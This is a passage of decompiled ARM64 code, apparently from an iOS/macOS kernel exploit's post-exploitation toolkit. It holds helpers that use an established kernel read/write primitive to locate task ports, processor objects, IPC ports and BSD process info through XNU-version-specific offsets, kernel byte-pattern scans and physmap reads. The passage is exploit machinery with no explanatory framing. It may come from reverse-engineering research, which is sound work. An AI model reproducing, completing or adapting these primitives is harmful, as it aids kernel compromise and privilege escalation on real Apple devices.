      v16 = 952;
    }
    goto LABEL_38;
  }
  if ( v9 == 8792 || v9 == 8796 || v9 == 10002 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_A17_MASK) )
    {
      v14 = 976;
      return v14 + v8;
    }
    v15 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
    v14 = 952;
    v16 = 928;
LABEL_38:
    if ( v15 )
      v14 = v16;
    return v14 + v8;
  }
  return result;
}

//----- (0000000000034F5C) ----------------------------------------------------
unsigned __int64 __fastcall get_task_port_kaddr_checked(struct_krwCtx *krwCtx, unsigned int a2, int a3, unsigned int *a4)
{
  unsigned __int64 v7; // x19
  unsigned int v8; // w9
  unsigned int v10; // [xsp+Ch] [xbp-24h] BYREF

  v10 = 0;
  v7 = get_task_port_kaddr(krwCtx, a2, a3);
  if ( !v7 )
    return v7;
  if ( !kread_u32(krwCtx, v7, &v10) )
    return 0;
  if ( krwCtx->xnuMajorVersion < 4904 )
  {
    v8 = HIBYTE(v10);
  }
  else
  {
    v8 = v10 & 3;
    if ( !a3 )
    {
      if ( v8 == 3 )
        goto LABEL_6;
      return 0;
    }
  }
  if ( v8 )
    return 0;
LABEL_6:
  if ( a4 )
    *a4 = v10;
  return v7;
}

//----- (0000000000034FF8) ----------------------------------------------------
unsigned __int64 __fastcall get_task_port_kaddr_wrap(struct_krwCtx *krwCtx, unsigned int a2, unsigned int *a3)
{
  return get_task_port_kaddr_checked(krwCtx, a2, 0, a3);
}

//----- (0000000000035004) ----------------------------------------------------
__int64 __fastcall find_proc_kobj_via_processors(struct_krwCtx *krwCtx, int a2, __int64 a3, unsigned int *a4)
{
  __int64 v8; // x26
  int v9; // w8
  __int64 v10; // x23
  __int64 v11; // x24
  __int64 v12; // x27
  __int64 v15; // x0
  __int64 v16; // x0
  unsigned __int64 v17; // x0
  unsigned __int64 v18; // x24
  mach_msg_type_number_t v19; // w25
  unsigned int v20; // w28
  unsigned __int64 v21; // x8
  kern_return_t v22; // w0
  mach_msg_type_number_t v23; // w8
  unsigned __int64 v24; // x28
  unsigned int v25; // w25
  unsigned __int64 v26; // x0
  unsigned __int64 v27; // x23
  unsigned __int64 v28; // x20
  vm_size_t v29; // x2
  mach_msg_type_number_t v31; // [xsp+4h] [xbp-8Ch]
  __int64 v32; // [xsp+8h] [xbp-88h] BYREF
  unsigned __int64 v33; // [xsp+10h] [xbp-80h] BYREF
  mach_msg_type_number_t out_processor_listCnt; // [xsp+1Ch] [xbp-74h] BYREF
  processor_array_t out_processor_list; // [xsp+20h] [xbp-70h] BYREF
  uint64_t v36[3]; // [xsp+28h] [xbp-68h] BYREF

  v8 = 163855;
  out_processor_list = 0;
  out_processor_listCnt = 0;
  v32 = 0;
  v33 = 0;
  v9 = krwCtx->xnuMajorVersion;
  v10 = 163847;
  if ( v9 > 8791 )
  {
    if ( v9 != 8792 && v9 != 8796 && v9 != 10002 )
      return v10;
    goto LABEL_17;
  }
  if ( (unsigned int)(v9 - 8019) < 2 )
  {
LABEL_17:
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
      v12 = 15676;
    else
      v12 = 2220;
    if ( krwCtx->xnuMajorVersion >= 8019 )
    {
      v15 = krwCtx->kernelMachoCtx;
      if ( !v15 )
        return 708625;
      macho_find_text_section(v15, v36);
      v16 = kernel_pattern_scan((__int64)v36, "14 D9 33 F8", 0);
      if ( !v16 )
        return 708625;
      v10 = 708620;
      v17 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v16 - 8));
      if ( !v17 )
        return 708625;
      v18 = v17;
      out_processor_listCnt = number_of_cpus();
      v31 = out_processor_listCnt;
      if ( out_processor_listCnt )
      {
        v19 = 0;
        v20 = 0;
        do
        {
          if ( !kread_physmap_decorated(krwCtx, v18 + krwCtx->stride_0x168 * v19, &v33) )
            return 163855;
          if ( v33 )
          {
            if ( !validate_kaddr_range(krwCtx, v33) )
              return 163878;
            v21 = v33;
          }
          else
          {
            v21 = 0;
          }
          if ( !kread_physmap_decorated(krwCtx, v21 + 40, (unsigned __int64 *)&v32) )
            return 163855;
          if ( !validate_kaddr_range(krwCtx, v32) )
            return 163878;
          if ( !kread_u32(krwCtx, v32 + v12, v36) )
            return 163855;
          if ( (unsigned int)(LODWORD(v36[0]) - 1) > 1 )
            return 163857;
          if ( LODWORD(v36[0]) == a2 )
          {
            if ( v20 >= *a4 )
              return v10;
            *(uint64_t *)(a3 + 8LL * v20++) = v33;
          }
          ++v19;
        }
        while ( v19 < v31 );
      }
      else
      {
        v20 = 0;
      }
      v10 = 0;
      *a4 = v20;
      return v10;
    }
    v11 = 40;
    goto LABEL_43;
  }
  if ( v9 == 6153 )
  {
    v12 = 1092;
    v11 = 32;
  }
  else
  {
    if ( v9 != 7195 )
      return v10;
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 80, 15, 1023, 1023) )
      v11 = 32;
    else
      v11 = 40;
    v12 = 1204;
  }
LABEL_43:
  v22 = host_processors(krwCtx->hostPrivPort, &out_processor_list, &out_processor_listCnt);
  if ( v22 )
    return v22 | 0x80000000;
  v23 = out_processor_listCnt;
  if ( !out_processor_listCnt )
  {
    v25 = 0;
LABEL_58:
    v10 = 0;
    *a4 = v25;
    goto LABEL_69;
  }
  v24 = 0;
  v25 = 0;
  while ( 1 )
  {
    v26 = get_task_kobject_addr(krwCtx, out_processor_list[v24]);
    v33 = v26;
    if ( !v26 )
    {
      v8 = 163854;
      goto LABEL_68;
    }
    v27 = v26;
    if ( !kread_physmap_decorated(krwCtx, v26 + v11, (unsigned __int64 *)&v32) )
      goto LABEL_68;
    if ( !validate_kaddr_range(krwCtx, v32) )
    {
      v8 = 163878;
      goto LABEL_68;
    }
    if ( !kread_u32(krwCtx, v32 + v12, v36) )
      goto LABEL_68;
    if ( (unsigned int)(LODWORD(v36[0]) - 1) > 1 )
    {
      v8 = 163857;
      goto LABEL_68;
    }
    if ( LODWORD(v36[0]) == a2 )
      break;
LABEL_55:
    ++v24;
    v23 = out_processor_listCnt;
    if ( v24 >= out_processor_listCnt )
      goto LABEL_58;
  }
  if ( v25 < *a4 )
  {
    *(uint64_t *)(a3 + 8LL * v25++) = v27;
    goto LABEL_55;
  }
  v8 = 708620;
LABEL_68:
  v23 = out_processor_listCnt;
  v10 = v8;
LABEL_69:
  if ( v23 )
  {
    v28 = 0;
    do
      mach_port_deallocate(mach_task_self_, out_processor_list[v28++]);
    while ( v28 < out_processor_listCnt );
    v29 = 4LL * out_processor_listCnt;
  }
  else
  {
    v29 = 0;
  }
  vm_deallocate(mach_task_self_, (vm_address_t)out_processor_list, v29);
  return v10;
}

//----- (00000000000353DC) ----------------------------------------------------
__int64 __fastcall get_task_port_offset(struct_krwCtx *krwCtx)
{
  int v1; // w8

  v1 = krwCtx->xnuMajorVersion;
  if ( (unsigned int)(v1 - 8019) < 2 )
    return 96LL;
  if ( v1 == 6153 )
    return 88LL;
  if ( v1 == 7195 )
    return 96LL;
  return 0LL;
}

//----- (0000000000035420) ----------------------------------------------------
__int64 __fastcall get_task_version_field(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 result; // x0
  int v4; // w8
  bool v5; // zf
  int v6; // w9
  __int64 v8; // x8

  result = 0LL;
  v4 = krwCtx->xnuMajorVersion;
  if ( v4 <= 8019 )
  {
    if ( v4 == 6153 || v4 == 7195 )
    {
      v8 = 64LL;
    }
    else
    {
      if ( v4 != 8019 )
        return result;
      v8 = 48LL;
    }
    return v8 + a2;
  }
  if ( v4 > 8795 )
  {
    v5 = v4 == 8796;
    v6 = 10002;
  }
  else
  {
    v5 = v4 == 8020;
    v6 = 8792;
  }
  if ( v5 || v4 == v6 )
  {
    v8 = 32LL;
    return v8 + a2;
  }
  return result;
}

//----- (00000000000354A4) ----------------------------------------------------
unsigned __int64 __fastcall get_mach_task_port_slot(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 result; // x0

  result = task_get_ipc_port(krwCtx, mach_task_self_, a2);
  if ( result )
  {
    return get_task_version_field(krwCtx, result);
  }
  return result;
}
// 354E4: variable 'vars8' is possibly undefined

//----- (0000000000035500) ----------------------------------------------------
__int64 __fastcall kread_mach_task_port_slot(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  __int64 v4; // [xsp+8h] [xbp-18h] BYREF

  result = get_mach_task_port_slot(krwCtx, a2);
  v4 = result;
  if ( result )
  {
    if ( kread_physmap_decorated(krwCtx, result, (unsigned __int64 *)&v4) )
    {
      if ( validate_kaddr_range(krwCtx, v4) )
        return v4;
      else
        return 0;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (0000000000035568) ----------------------------------------------------
__int64 __fastcall kread_mach_task_port_slot_plus80(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  unsigned __int64 xnuVersionPacked; // x8
  unsigned __int64 v5; // x1
  bool v6; // cc
  __int64 v7; // x8
  __int64 v8; // [xsp+8h] [xbp-18h] BYREF

  result = kread_mach_task_port_slot(krwCtx, a2);
  v8 = result;
  if ( result )
  {
    xnuVersionPacked = krwCtx->xnuVersionPacked;
    if ( xnuVersionPacked < XNU_VERSION_PACKED(7195, 42, 1, 0, 0) )
    {
      v5 = result + 24;
    }
    else
    {
      if ( xnuVersionPacked >> 43 >= 0x44B )
        return result + 80;
      v6 = xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
      v7 = 32;
      if ( v6 )
        v7 = 24;
      v5 = v7 + result;
    }
    if ( kread_physmap_decorated(krwCtx, v5, (unsigned __int64 *)&v8) )
      return v8;
    return 0;
  }
  return result;
}

//----- (0000000000035610) ----------------------------------------------------
unsigned __int64 __fastcall get_ipc_port_kaddr_via_host(struct_krwCtx *krwCtx, int a2)
{
  unsigned __int64 v4; // x1
  unsigned __int64 v5; // x0
  unsigned int v6; // w0
  unsigned __int64 ipc_port; // x0
  unsigned __int64 v9; // [xsp+8h] [xbp-18h] BYREF

  v4 = krwCtx->gap_0x1A8_size8;
  if ( !v4 )
  {
    v6 = get_privileged_host_port(krwCtx);
    if ( v6 + 1 < 2 )
      return 0;
    ipc_port = task_get_ipc_port(krwCtx, mach_task_self_, v6);
    v4 = ipc_port;
    if ( !ipc_port )
      return v4;
    krwCtx->gap_0x1A8_size8 = ipc_port;
  }
  if ( a2 == 1 )
    return v4;
  v5 = maybe_ipc_port_get_kobject(krwCtx, v4);
  if ( !v5 )
    return 0;
  if ( kread_physmap_decorated(krwCtx, v5 + (unsigned int)(krwCtx->stride_0x168 * a2) + 16, &v9) )
    return v9;
  else
    return 0;
}

//----- (00000000000356C8) ----------------------------------------------------
__int64 __fastcall get_task_bsd_info_kaddr(struct_krwCtx *krwCtx, unsigned int a2, __int64 *a3)
{
  __int64 v5; // x19
  int xnuMajorVersion; // w8
  unsigned __int64 v9; // x0
  __int64 v11; // [xsp+8h] [xbp-28h] BYREF

  v5 = 163847;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8018 )
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 8792 )
      return v5;
LABEL_12:
    v9 = get_task_kobject_addr(krwCtx, a2);
    if ( !v9 )
      return 163877;
    if ( !kread_physmap_decorated(krwCtx, v9 + 56, (unsigned __int64 *)&v11) )
      return 163855;
    if ( !validate_kaddr_range(krwCtx, v11) )
      return 163878;
    v5 = 0;
    *a3 = v11;
    return v5;
  }
  if ( xnuMajorVersion == 6153 || xnuMajorVersion == 7195 )
    goto LABEL_12;
  return v5;
}

